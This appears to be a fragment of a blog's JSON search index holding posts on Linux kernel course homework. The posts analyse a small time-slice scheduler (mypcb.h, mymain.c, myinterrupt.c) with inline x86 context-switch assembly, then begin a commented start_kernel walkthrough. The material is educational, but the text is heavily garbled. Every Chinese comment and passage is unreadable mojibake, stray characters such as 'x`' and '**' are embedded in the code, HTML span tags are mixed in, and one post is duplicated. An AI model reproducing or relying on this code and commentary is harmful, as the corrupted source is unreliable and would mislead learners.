task[pid].thread.sp to esp */ \u0026quot;pushl %1\\n\\t\u0026quot; /* push ebp ,å½“å‰esp=ebp*/ \u0026quot;pushl %0\\n\\t\u0026quot; /* push task[pid].thread.ip */ \u0026quot;ret\\n\\t\u0026quot; /* pop task[pid].thread.ip to eip */ \u0026quot;popl %%ebp\\n\\t\u0026quot; : : \u0026quot;c\u0026quot; (task[pid].thread.ip),\u0026quot;d\u0026quot; (task[pid].thread.sp) ); } void my_process(void) { int i = 0; while(1) { i++; if(i%10000000 == 0) { printk(KERN_NOTICE \u0026quot;this is process %d -\\n\u0026quot;,my_current_task-\u0026gt;pid); if(my_need_sched == 1)//åˆ¤æ–­æ˜¯å¦è°ƒåº¦ï¼›è¯¥å€¼å¯æœ‰itnerrupt.cä¸­çš„å‡½æ•°æ¥é…ç½® { my_need_sched = 0; my_schedule(); //ä¸»åŠ¨è°ƒåŠ¨çš„æœºåˆ¶ } printk(KERN_NOTICE \u0026quot;this is process %d +\\n\u0026quot;,my_current_task-\u0026gt;pid); } } } myinterrupt.c /* linux/mykernel/myinterrupt.c * Kernel internal my_timer_handler * Copyright (C) 2013 Mengning */ #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/string.h\u0026gt; #include \u0026lt;linux/ctype.h\u0026gt; #include \u0026lt;linux/tty.h\u0026gt; #include \u0026lt;linux/vmalloc.h\u0026gt; #include \u0026quot;mypcb.h\u0026quot; extern tPCB task[MAX_TASK_NUM]; extern tPCB * my_current_task; extern volatile int my_need_sched; volatile int time_count = 0; /* * Called by timer interrupt. * it runs in the name of current running process, * so it use kernel stack of current running process */ void my_timer_handler(void) { #if 1 if(time_count%1000 == 0 \u0026amp;\u0026amp; my_need_sched != 1)//æ—¶é’Ÿä¸­æ–­1000æ¬¡çš„æ—¶å€™ï¼Œè°ƒåº¦ä¸€æ¬¡, é…ç½®è°ƒåº¦å€¼ä¸º1 { printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;my_timer_handler here\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;); my_need_sched = 1; } time_count ++ ; #endif return; } void my_schedule(void) //è°ƒåº¦å‡½æ•°, æ ¸å¿ƒå‡½æ•° { tPCB * next;//å®šä¹‰ä¸¤ä¸ªæŒ‡é’ˆ tPCB * prev; if(my_current_task == NULL //å½“å‰è¿›ç¨‹å’Œä¸‹ä¸€è¿›ç¨‹ä¸ºç©º, å³æ²¡æœ‰ä»»åŠ¡, è¿”å› || my_current_task-\u0026gt;next == NULL) { return; } printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;my_schedule\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;); /* åœ¨è°ƒåº¦å‡½æ•°ä¸­, nextæŒ‡å‘çš„æ˜¯ä¸‹ä¸€ä¸ªå°†è¦è¢«è°ƒåº¦çš„ä»»åŠ¡, prevæŒ‡å‘çš„æ˜¯å½“å‰æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡*/ /* schedule */ next = my_current_task-\u0026gt;next;//æŠŠå½“å‰è¿›ç¨‹çš„ä¸‹ä¸€ä¸ªè¿›ç¨‹èµ‹å€¼ç»™nextï¼Œå½“å‰è¿›ç¨‹èµ‹å€¼ç»™prev prev = my_current_task; if(next-\u0026gt;state == 0)/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ //å¦‚æœä¸‹ä¸€ä¸ªä»»åŠ¡ä¸æ˜¯ç¬¬ä¸€æ¬¡è¢«è°ƒåº¦, åˆ™æ‰§è¡Œ { /* switch to next processâ€”â€”è¿™ä¸ªæ—¶å€™ä¸‹ä¸€ä¸ªè¿›ç¨‹æœ‰è¿›ç¨‹ä¸Šä¸‹æ–‡ */ asm volatile( \u0026quot;pushl %%ebp\\n\\t\u0026quot; /* save å½“å‰è¿›ç¨‹ ebp */ \u0026quot;movl %%esp,%0\\n\\t\u0026quot; /* save å½“å‰ esp èµ‹å€¼åˆ°prev.thread.sp */ \u0026quot;movl %2,%%esp\\n\\t\u0026quot; /* restore ä¸‹ä¸€ä¸ªè¿›ç¨‹çš„spåˆ° esp */ \u0026quot;movl $1f,%1\\n\\t\u0026quot; /* save å½“å‰è¿›ç¨‹çš„ eip */ \u0026quot;pushl %3\\n\\t\u0026quot; //ä¿å­˜ä¸‹ä¸€ä¸ªè¿›ç¨‹eipä¿å­˜åˆ°æ ˆé‡Œé¢ \u0026quot;ret\\n\\t\u0026quot; /* restore eip */ \u0026quot;1:\\t\u0026quot; /* next process start here */ \u0026quot;popl %%ebp\\n\\t\u0026quot;** : \u0026quot;=m\u0026quot; (prev-\u0026gt;thread.sp),\u0026quot;=m\u0026quot; (prev-\u0026gt;thread.ip)** : \u0026quot;m\u0026quot; (next-\u0026gt;thread.sp),\u0026quot;m\u0026quot; (next-\u0026gt;thread.ip)** ); my_current_task = next; printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;switch %d to %d\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;,prev-\u0026gt;pid,next-\u0026gt;pid); } else//ä¸‹ä¸€ä¸ªè¿›ç¨‹ä¸ºç¬¬ä¸€æ¬¡è¿è¡Œæ—¶,æ²¡æœ‰è¿›ç¨‹ä¸Šä¸‹æ–‡, åˆ™ä»¥ä¸‹é¢è¿™ç§æ–¹å¼æ¥å¤„ç† { next-\u0026gt;state = 0; my_current_task = next; printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;switch %d to %d\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;,prev-\u0026gt;pid,next-\u0026gt;pid); /* switch to new process */ asm volatile( \u0026quot;pushl %%ebp\\n\\t\u0026quot; /* save ebp */ \u0026quot;movl %%esp,%0\\n\\t\u0026quot; /* save esp */x` \u0026quot;movl %2,%%esp\\n\\t\u0026quot; /* restore esp */ \u0026quot;movl %2,%%ebp\\n\\t\u0026quot; /* restore ebp */ \u0026quot;movl $1f,%1\\n\\t\u0026quot; /* save eip */ \u0026quot;pushl %3\\n\\t\u0026quot;** \u0026quot;ret\\n\\t\u0026quot; /* restore eip */** : \u0026quot;=m\u0026quot; (prev-\u0026gt;thread.sp),\u0026quot;=m\u0026quot; (prev-\u0026gt;thread.ip) : \u0026quot;m\u0026quot; (next-\u0026gt;thread.sp),\u0026quot;m\u0026quot; (next-\u0026gt;thread.ip) ); } return; } ä»¥æ–°ä»»åŠ¡åˆ‡æ¢ä¸ºä¾‹è¿›è¡Œå †æ ˆå˜åŒ–åˆ†æï¼š\næ‰§è¡Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n","date":1425215067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425215067,"objectID":"18e4d1e6c3708e53658f326075dfedb0","permalink":"http://www.guozet.me/post/Linux-Kernel-analysis-Os-work-copy/","publishdate":"2015-03-01T13:04:27Z","relpermalink":"/post/Linux-Kernel-analysis-Os-work-copy/","section":"post","summary":"Linuxå†…æ ¸è¯¾ç¬¬äºŒå‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\n","tags":"Linux kernel","title":"Linuxå†…æ ¸åˆ†æè¯¾ç¨‹2_æ“ä½œç³»ç»Ÿæ˜¯å¦‚ä½•å·¥ä½œçš„","type":"post"},{"authors":null,"categories":"Linux","content":"Linuxå†…æ ¸è¯¾ç¬¬äºŒå‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\nè®¡ç®—æœºæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼ˆå°ç»“ï¼‰ æ¦‚å¿µ è®¡ç®—æœºçš„å·¥ä½œï¼Œä¸€è¨€ä»¥è”½ä¹‹ï¼šæ‰§è¡Œç¨‹åºçš„è¿‡ç¨‹ï¼›ä¹Ÿå°±æ˜¯å­˜å‚¨ç¨‹åºå’Œ ç¨‹åºæ§åˆ¶çš„è¿‡ç¨‹ã€‚\nå­˜å‚¨ç¨‹åºè®¡ç®—æœºå·¥ä½œæ¨¡å‹ï¼Œè®¡ç®—æœºç³»ç»Ÿæœ€æœ€åŸºç¡€æ€§çš„é€»è¾‘ç»“æ„ å‡½æ•°è°ƒç”¨å †æ ˆï¼Œé«˜çº§è¯­è¨€å¾—ä»¥è¿è¡Œçš„åŸºç¡€ ä¸­æ–­ï¼Œå¤šé“ç¨‹åºæ“ä½œç³»ç»Ÿçš„åŸºç‚¹ ä»¥ä¾‹åˆ†æ ä¸€ä¸ªç®€å•çš„ä¸­æ–­çš„ä¾‹å­(ç‚¹å‡»è¿›å…¥)\nç®€è¦åˆ†æmymain.cä¸myinterrupt.c void __init my_start_kernel(void) // mymain.cä¸­ä¸»è¦å†…å®¹ { int i = 0; while (1) { i++; if (i % 100000 == 0) //æ¯å¾ªç¯åä¸‡æ¬¡æ‰“å°ä¸€æ¬¡my_start_kernel here printk(KERN_NOTICE \u0026quot;my_start_kernel here %d \\n\u0026quot;, i); } } void my_timer_handler(void) //æ¯æ¬¡æ—¶é’Ÿä¸­æ–­è°ƒç”¨ä¸€æ¬¡ myinterrupt.cä¸­ä¸»è¦å†…å®¹ { printk(KERN_NOTICE \u0026quot;\\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;my_timer_handler here\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\\n\\n\u0026quot;); } å¯è§ï¼Œè¿™åªæ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„æ—¶é’Ÿä¸­æ–­æ¼”ç¤ºå®éªŒï¼Œæ‰§è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š\nå¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°ï¼Œæ—¶é’Ÿæ¯è®°æ•°åˆ°åä¸‡çš„æ—¶å€™ï¼Œæ‰“å°ä¸€ä¸ªmy_start_kernel hereï¼Œæ—¶é’Ÿä¸­æ–­çš„æ—¶å€™æ‰§è¡Œmy_time_hander here.\nåœ¨ç¬¬ä¸€ä¸ªçš„åŸºç¡€ä¸Šè¿›è¡Œæ—¶é—´ç‰‡è½®è½¬å¤šé“ç¨‹åºçš„å°os. ä¸»è¦å¯¹mypcb.h, mymain.c å’Œmyinterrupt.cè¿™ä¸‰ä¸ªæ–‡ä»¶è¿›è¡Œåˆ†æ\nmypcb.h / * linux/mykernel/**mypcb.h** * Kernel internal PCB types * Copyright (C) 2013 Mengning */ #define MAX_TASK_NUM 4 #define KERNEL_STACK_SIZE 1024*8 /* CPU-specific state of this task */ struct Thread {//ç»™ä»»åŠ¡å®šä¹‰ä¸€ä¸ªeipå’Œesp unsigned longip; unsigned longsp; }; typedef struct PCB{ int pid;//ä»»åŠ¡ç¼–å· volatile long state;/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ char stack[KERNEL_STACK_SIZE]; //å®šä¹‰æ ˆç©ºé—´ /* CPU-specific state of this task */ struct Thread thread; //å®šä¹‰è¿›ç¨‹çš„ç»“æ„ä½“thread, å…¶ä¸­æœ‰eipå’Œesp unsigned longtask_entry;//ä»»åŠ¡çš„å‡½æ•°èµ·å§‹å¤„, ä¹Ÿå°±æ˜¯ä»»åŠ¡ç¬¬ä¸€æ¬¡æ‰§è¡Œçš„èµ·å§‹ä½ç½® struct PCB *next;//ä¸€ä¸ªä»»åŠ¡é“¾è¡¨, æŒ‡å‘ä¸‹ä¸€ä¸ªä»»åŠ¡ }tPCB; void my_schedule(void);//ä»»åŠ¡è°ƒåŠ¨å‡½æ•°** mymain.c /* linux/mykernel/mymain.c * Kernel internal my_start_kernel * Copyright (C) 2013 Mengning */ #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/string.h\u0026gt; #include \u0026lt;linux/ctype.h\u0026gt; #include \u0026lt;linux/tty.h\u0026gt; #include \u0026lt;linux/vmalloc.h\u0026gt; #include \u0026quot;mypcb.h\u0026quot; //å¼•å…¥å…¶ä¸­ä¸¤ä¸ªç»“æ„ä½“è¡¨ç¤º** tPCB task[MAX_TASK_NUM];//å®šä¹‰ä¸¤ä¸ªæ•°ç»„ tPCB * my_current_task = NULL; volatile int my_need_sched = 0;//å®šä¹‰æ˜¯å¦è°ƒåº¦, 1åˆ™è°ƒåº¦, 0åˆ™ä¸è°ƒåº¦ void my_process(void); void __init my_start_kernel(void) **//èµ·å§‹å‡½æ•°ä½ç½®** { int pid = 0; int i; /* Initialize process 0*/ task[pid].pid = pid; task[pid].state = 0;/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ task[pid].task_entry = task[pid].thread.ip = (unsigned long)my_process; task[pid].thread.sp = (unsigned long)\u0026amp;task[pid].stack[KERNEL_STACK_SIZE-1]; //0å·è¿›ç¨‹æ ˆåœ¨æœ€å¼€å§‹çš„ä½ç½®** task[pid].next = \u0026amp;task[pid];//ä¸‹ä¸€ä¸ªä»»åŠ¡ä¹Ÿæ˜¯è‡ªå·±ï¼Œåœ¨è¿™é‡Œï¼Œå…¶ä»–ä»»åŠ¡è¿˜æ²¡æœ‰åˆ›å»º /*fork more process *///åˆ›å»ºå¤šä¸ªä»»åŠ¡ for(i=1;i\u0026lt;MAX_TASK_NUM;i++) { memcpy(\u0026amp;task[i],\u0026amp;task[0],sizeof(tPCB));//å¤åˆ¶0å·è¿›ç¨‹çš„ç»“æ„å½¢å¼ task[i].pid = i; task[i].state = -1;//åˆå§‹çš„ä»»åŠ¡(é™¤0å·è¿›ç¨‹å¤–)éƒ½è®¾ç½®æˆæœªè¿è¡Œ task[i].thread.sp = (unsigned long)\u0026amp;task[i].stack[KERNEL_STACK_SIZE-1]; task[i].next = task[i-1].next;//æ–°forkçš„è¿›ç¨‹åŠ åˆ°è¿›ç¨‹é“¾è¡¨çš„å°¾éƒ¨, è¯¥æ–°å»ºä»»åŠ¡çš„nextæŒ‡å‘ä¸Šä¸€ä¸ªä»»åŠ¡çš„next,ä¹Ÿå°±æ˜¯è‡ªå·±ï¼ˆæœ€åä¸€ä¸ªï¼‰ task[i-1].next = \u0026amp;task[i]; //é…ç½®ä¸Šä¸€ä¸ªä»»åŠ¡çš„nextæŒ‡å‘è¿™æ—¶å€™æ–°åˆ›å»ºçš„ä»»åŠ¡ } /* start process 0 by task[0] */ pid = 0; my_current_task = \u0026amp;task[pid];//å…ˆè®©0å·è¿›ç¨‹å…ˆæ‰§è¡Œ asm volatile( \u0026quot;movl %1,%%esp\\n\\t\u0026quot; /* set task[pid].thread.sp to esp */ \u0026quot;pushl %1\\n\\t\u0026quot; /* push ebp ,å½“å‰esp=ebp*/ \u0026quot;pushl %0\\n\\t\u0026quot; /* push task[pid].thread.ip */ \u0026quot;ret\\n\\t\u0026quot; /* pop task[pid].thread.ip to eip */ \u0026quot;popl %%ebp\\n\\t\u0026quot; : : \u0026quot;c\u0026quot; (task[pid].thread.ip),\u0026quot;d\u0026quot; (task[pid].thread.sp) ); } void my_process(void) { int i = 0; while(1) { i++; if(i%10000000 == 0) { printk(KERN_NOTICE \u0026quot;this is process %d -\\n\u0026quot;,my_current_task-\u0026gt;pid); if(my_need_sched == 1)//åˆ¤æ–­æ˜¯å¦è°ƒåº¦ï¼›è¯¥å€¼å¯æœ‰itnerrupt.cä¸­çš„å‡½æ•°æ¥é…ç½® { my_need_sched = 0; my_schedule(); //ä¸»åŠ¨è°ƒåŠ¨çš„æœºåˆ¶ } printk(KERN_NOTICE \u0026quot;this is process %d +\\n\u0026quot;,my_current_task-\u0026gt;pid); } } } myinterrupt.c /* linux/mykernel/myinterrupt.c * Kernel internal my_timer_handler * Copyright (C) 2013 Mengning */ #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/string.h\u0026gt; #include \u0026lt;linux/ctype.h\u0026gt; #include \u0026lt;linux/tty.h\u0026gt; #include \u0026lt;linux/vmalloc.h\u0026gt; #include \u0026quot;mypcb.h\u0026quot; extern tPCB task[MAX_TASK_NUM]; extern tPCB * my_current_task; extern volatile int my_need_sched; volatile int time_count = 0; /* * Called by timer interrupt. * it runs in the name of current running process, * so it use kernel stack of current running process */ void my_timer_handler(void) { #if 1 if(time_count%1000 == 0 \u0026amp;\u0026amp; my_need_sched != 1)//æ—¶é’Ÿä¸­æ–­1000æ¬¡çš„æ—¶å€™ï¼Œè°ƒåº¦ä¸€æ¬¡, é…ç½®è°ƒåº¦å€¼ä¸º1 { printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;my_timer_handler here\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;); my_need_sched = 1; } time_count ++ ; #endif return; } void my_schedule(void) //è°ƒåº¦å‡½æ•°, æ ¸å¿ƒå‡½æ•° { tPCB * next;//å®šä¹‰ä¸¤ä¸ªæŒ‡é’ˆ tPCB * prev; if(my_current_task == NULL //å½“å‰è¿›ç¨‹å’Œä¸‹ä¸€è¿›ç¨‹ä¸ºç©º, å³æ²¡æœ‰ä»»åŠ¡, è¿”å› || my_current_task-\u0026gt;next == NULL) { return; } printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;my_schedule\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;); /* åœ¨è°ƒåº¦å‡½æ•°ä¸­, nextæŒ‡å‘çš„æ˜¯ä¸‹ä¸€ä¸ªå°†è¦è¢«è°ƒåº¦çš„ä»»åŠ¡, prevæŒ‡å‘çš„æ˜¯å½“å‰æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡*/ /* schedule */ next = my_current_task-\u0026gt;next;//æŠŠå½“å‰è¿›ç¨‹çš„ä¸‹ä¸€ä¸ªè¿›ç¨‹èµ‹å€¼ç»™nextï¼Œå½“å‰è¿›ç¨‹èµ‹å€¼ç»™prev prev = my_current_task; if(next-\u0026gt;state == 0)/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ //å¦‚æœä¸‹ä¸€ä¸ªä»»åŠ¡ä¸æ˜¯ç¬¬ä¸€æ¬¡è¢«è°ƒåº¦, åˆ™æ‰§è¡Œ { /* switch to next processâ€”â€”è¿™ä¸ªæ—¶å€™ä¸‹ä¸€ä¸ªè¿›ç¨‹æœ‰è¿›ç¨‹ä¸Šä¸‹æ–‡ */ asm volatile( \u0026quot;pushl %%ebp\\n\\t\u0026quot; /* save å½“å‰è¿›ç¨‹ ebp */ \u0026quot;movl %%esp,%0\\n\\t\u0026quot; /* save å½“å‰ esp èµ‹å€¼åˆ°prev.thread.sp */ \u0026quot;movl %2,%%esp\\n\\t\u0026quot; /* restore ä¸‹ä¸€ä¸ªè¿›ç¨‹çš„spåˆ° esp */ \u0026quot;movl $1f,%1\\n\\t\u0026quot; /* save å½“å‰è¿›ç¨‹çš„ eip */ \u0026quot;pushl %3\\n\\t\u0026quot; //ä¿å­˜ä¸‹ä¸€ä¸ªè¿›ç¨‹eipä¿å­˜åˆ°æ ˆé‡Œé¢ \u0026quot;ret\\n\\t\u0026quot; /* restore eip */ \u0026quot;1:\\t\u0026quot; /* next process start here */ \u0026quot;popl %%ebp\\n\\t\u0026quot;** : \u0026quot;=m\u0026quot; (prev-\u0026gt;thread.sp),\u0026quot;=m\u0026quot; (prev-\u0026gt;thread.ip)** : \u0026quot;m\u0026quot; (next-\u0026gt;thread.sp),\u0026quot;m\u0026quot; (next-\u0026gt;thread.ip)** ); my_current_task = next; printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;switch %d to %d\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;,prev-\u0026gt;pid,next-\u0026gt;pid); } else//ä¸‹ä¸€ä¸ªè¿›ç¨‹ä¸ºç¬¬ä¸€æ¬¡è¿è¡Œæ—¶,æ²¡æœ‰è¿›ç¨‹ä¸Šä¸‹æ–‡, åˆ™ä»¥ä¸‹é¢è¿™ç§æ–¹å¼æ¥å¤„ç† { next-\u0026gt;state = 0; my_current_task = next; printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;switch %d to %d\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;,prev-\u0026gt;pid,next-\u0026gt;pid); /* switch to new process */ asm volatile( \u0026quot;pushl %%ebp\\n\\t\u0026quot; /* save ebp */ \u0026quot;movl %%esp,%0\\n\\t\u0026quot; /* save esp */x` \u0026quot;movl %2,%%esp\\n\\t\u0026quot; /* restore esp */ \u0026quot;movl %2,%%ebp\\n\\t\u0026quot; /* restore ebp */ \u0026quot;movl $1f,%1\\n\\t\u0026quot; /* save eip */ \u0026quot;pushl %3\\n\\t\u0026quot;** \u0026quot;ret\\n\\t\u0026quot; /* restore eip */** : \u0026quot;=m\u0026quot; (prev-\u0026gt;thread.sp),\u0026quot;=m\u0026quot; (prev-\u0026gt;thread.ip) : \u0026quot;m\u0026quot; (next-\u0026gt;thread.sp),\u0026quot;m\u0026quot; (next-\u0026gt;thread.ip) ); } return; } ä»¥æ–°ä»»åŠ¡åˆ‡æ¢ä¸ºä¾‹è¿›è¡Œå †æ ˆå˜åŒ–åˆ†æï¼š\næ‰§è¡Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n","date":1425215067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425215067,"objectID":"28c021ae3e7229dc3cfba46758c3cea5","permalink":"http://www.guozet.me/post/Linux-Kernel-analysis-Os-work/","publishdate":"2015-03-01T13:04:27Z","relpermalink":"/post/Linux-Kernel-analysis-Os-work/","section":"post","summary":"Linuxå†…æ ¸è¯¾ç¬¬äºŒå‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\n","tags":"Linux kernel","title":"Linuxå†…æ ¸åˆ†æè¯¾ç¨‹2_æ“ä½œç³»ç»Ÿæ˜¯å¦‚ä½•å·¥ä½œçš„","type":"post"},{"authors":null,"categories":"Linux","content":"Linuxå†…æ ¸è¯¾ç¬¬ä¸‰å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\nåˆ†æStart_kernelå‡½æ•° æˆ‘ä½¿ç”¨çš„æ˜¯linux-2.6.14çš„æºä»£ç æ¥åˆ†æçš„ã€‚åœ¨è¿™é‡Œçªå‡ºé‡ç‚¹ï¼Œä¸»è¦æ¥åˆ†æstart_kernelè¿™ä¸ªå‡½æ•°ä¸­çš„å¤§è‡´å®ç°ã€‚å¼€æœºå¯åŠ¨åˆ°start_kernelè¿™ä¸ªè¿‡ç¨‹ä¸»è¦æ˜¯æ±‡ç¼–æ¥å®ç°çš„ï¼Œå…·ä½“å¯å‚è€ƒ\nlinux kernel ä»å…¥å£åˆ°start_kernel çš„ä»£ç åˆ†æ start_kernel()è¿™ä¸ªå‡½æ•°æ˜¯å†…æ ¸ç”±å¼•å¯¼ç¨‹åºå¼•å¯¼ä»¥åï¼Œç”±è‡ªè§£å‹ç¨‹åºè§£å‹ä»¥åæ‰§è¡Œçš„ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯æ•´ä¸ªå†…æ ¸çš„å…¥å£å‡½æ•°ï¼Œstart_kernel()åšçš„å·¥ä½œå°±æ˜¯çº¿æ€§çš„åˆå§‹åŒ–ä¸€äº›å†…æ ¸çš„åŸºç¡€æœºåˆ¶ï¼Œå¦‚ä¸­æ–­ï¼Œå†…å­˜ç®¡ç†ï¼Œè¿›ç¨‹ç®¡ç†ï¼Œä¿¡å·ï¼Œæ–‡ä»¶ç³»ç»Ÿï¼ŒKOç­‰ï¼æœ€åå°±å¯åŠ¨ä¸€ä¸ªinitçº¿ç¨‹ï¼Œinitçº¿ç¨‹å†è¯»å–æ–‡ä»¶ç³»ç»Ÿé‡Œçš„initç¨‹åºï¼Œåšä¸ºç³»ç»Ÿçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹è€Œå­˜åœ¨ï¼\nstart_kernelæºç å¦‚ä¸‹ï¼š\n\u0026lt;span style=\u0026quot;font-size:14px;\u0026quot;\u0026gt;asmlinkage void __init start_kernel(void) { char * command_line; //å‘½ä»¤è¡Œï¼Œç”¨æ¥å­˜æ”¾bootloaderä¼ é€’è¿‡æ¥çš„å‚æ•° extern struct kernel_param __start___param[], __stop___param[];\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;\u0026quot;\u0026gt;//è¿™ä¸¤ä¸ªå˜é‡ä¸ºåœ°å€æŒ‡é’ˆï¼ŒæŒ‡å‘å†…æ ¸å¯åŠ¨å‚æ•°å¤„ç†ç›¸å…³ç»“æ„ä½“åœ¨å†…å­˜çš„ä½ç½®ï¼Œ \u0026lt;/span\u0026gt; lock_kernel();\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;\u0026quot;\u0026gt;//å»ºç«‹ä¸€ä¸ªå“ˆå¸Œè¡¨(hash tables)ï¼Œå°±æ˜¯ä¸€ä¸ªå‰åæŒ‡å‘çš„æŒ‡é’ˆç»“æ„ä½“æ•°ç»„ã€‚\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;\u0026quot;\u0026gt;ã€å‡½æ•°çš„ä¸»è¦ä½œç”¨æ˜¯åˆå§‹åŒ–é”çš„çŠ¶æ€è·Ÿè¸ªæ¨¡å—ã€‚ç”±äºå†…æ ¸å¤§é‡ä½¿ç”¨é”æ¥è¿›è¡Œå¤šè¿›ç¨‹å¤šå¤„ç†å™¨çš„åŒæ­¥æ“ä½œï¼Œæ­»é”å°±ä¼šåœ¨ä»£ç ä¸åˆç†çš„æ—¶å€™å‡ºç°ï¼Œä½†æ˜¯è¦å®šä½å“ªä¸ªé”æ¯”è¾ƒå›°éš¾ï¼Œç”¨å“ˆå¸Œè¡¨å¯ä»¥è·Ÿè¸ªé”çš„ä½¿ç”¨çŠ¶æ€ã€‚æ­»é”æƒ…å†µï¼šä¸€ä¸ªè¿›ç¨‹é€’å½’åŠ é”åŒä¸€æŠŠé”ï¼›åŒä¸€æŠŠé”åœ¨ä¸¤æ¬¡ä¸­æ–­ä¸­åŠ é”ï¼›å‡ æŠŠé”å½¢æˆé—­ç¯æ­»é”ã€‘\u0026lt;/span\u0026gt; page_address_init(); //åˆå§‹åŒ–é«˜ç«¯å†…å­˜çš„æ˜ å°„è¡¨ printk(KERN_NOTICE); //æ‰“å°ä¿¡æ¯ printk(linux_banner); //æ‰“å°Linuxçš„ç‰ˆæœ¬ä¿¡æ¯ setup_arch(\u0026amp;command_line); \u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;\u0026quot;\u0026gt;//å†…æ ¸æ¶æ„ç›¸å…³åˆå§‹åŒ–å‡½æ•°ï¼Œæ˜¯éå¸¸é‡è¦çš„ä¸€ä¸ªåˆå§‹åŒ–æ­¥éª¤ã€‚å…¶ä¸­åŒ…å«äº†å¤„ç†å™¨ç›¸å…³å‚æ•°çš„åˆå§‹åŒ–ã€å†…æ ¸å¯åŠ¨å‚æ•°(tagged list)çš„è·å–å’Œå‰æœŸå¤„ç†ã€å†…å­˜å­ç³»ç»Ÿçš„æ—©æœŸåˆå§‹åŒ–(bootmemåˆ†é…å™¨)\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;\u0026quot;\u0026gt; setup_per_cpu_areas();\u0026lt;/span\u0026gt; smp_prepare_boot_cpu();//ä¸ºSMPç³»ç»Ÿé‡Œå¼•å¯¼CPU(boot-cpu)è¿›è¡Œå‡†å¤‡å·¥ä½œã€‚åœ¨ARMç³»ç»Ÿå•æ ¸é‡Œæ˜¯ç©ºå‡½æ•° sched_init();\u0026lt;span style=\u0026quot;white-space:pre\u0026quot;\u0026gt;\t\u0026lt;/span\u0026gt;//å¯¹è¿›ç¨‹è°ƒåº¦å™¨çš„æ•°æ®ç»“æ„è¿›è¡Œåˆå§‹åŒ–ï¼Œåˆ›å»ºè¿è¡Œé˜Ÿåˆ—ï¼Œè®¾ç½®å½“å‰ä»»åŠ¡çš„ç©ºçº¿ç¨‹ï¼Œå½“å‰ä»»åŠ¡çš„è°ƒåº¦ç­–ç•¥ä¸ºCFSè°ƒåº¦å™¨ preempt_disable(); 